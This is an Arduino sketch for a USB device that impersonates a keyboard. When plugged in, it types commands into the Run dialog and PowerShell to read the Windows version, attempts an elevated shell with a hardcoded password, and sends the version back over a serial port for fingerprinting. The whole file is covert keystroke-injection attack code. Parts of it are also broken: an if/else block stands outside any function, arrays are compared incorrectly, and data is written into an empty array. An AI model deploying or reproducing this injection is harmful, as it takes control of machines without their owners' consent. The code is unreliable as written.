#include <HID.h>
#include <Keyboard.h>

int incomingByte = 0;   // for incoming serial data
int win7Test[] = {77,105,99,114,111,115,111,102,116,32,87,105,110,100,111,119,115,32,55,32,80,114,111,102,101,115,115,105,111,110,97,108};
int comparetoArray[] = {};
int indexer = 0;

// Init function
void setup()
{
  // Start Keyboard and Mouse
  Keyboard.begin();
  Serial.begin(9600);
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  delay(900);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("powershell.exe");
  delay(1000);

  int x = 0;
  Keyboard.println("$winVersion = Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption");
 
  Keyboard.println("Start-Process powershell -verb runAs");
  delay(500);
  Keyboard.println("P@ssw0rd");
  delay(500);


    
  Keyboard.println("$port= new-Object System.IO.Ports.SerialPort $( [System.IO.Ports.SerialPort]::getportnames()),9600,None,8,one");
  Keyboard.println("$port.open()");
  Keyboard.println("$port.WriteLine(\"$($winVersion)\")");

  //

  
  Keyboard.end();
  
}

// Unused
void loop() 
{
     if (Serial.available() > 0) {
          // read the incoming byte:
          incomingByte = Serial.read();

          comparetoArray[indexer] = incomingByte;
          indexer++;

  }

}

if (win7Test == comparetoArray)
{
  Keyboard.println("They're equal!");
}
else
{
  Keyboard.println("They're NOT equal!");
}
